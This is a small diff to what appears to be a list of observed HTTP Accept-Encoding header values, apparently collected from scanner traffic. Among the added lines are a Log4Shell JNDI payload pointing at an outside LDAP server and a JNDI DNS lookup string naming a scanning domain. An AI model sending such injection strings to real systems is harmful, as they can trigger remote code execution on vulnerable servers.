@@ -1,3 +1,4 @@
+${jndi:ldap://185.8.172.132:1389/a}
 *
 default
 deflate, gzip
@@ -6,9 +7,11 @@ deflate, gzip, identity
 gzip
 gzip, deflate
 gzip, deflate, br
+gzip, deflate, compress
 gzip, deflate, sdch
 gzip,deflate
 gzip,deflate,br
 gzip;q=1.0,deflate;q=0.6,identity;q=0.3
 identity
 none
+{jndi:dns://204-48-20-180.acceptencoding.scanworld.net}
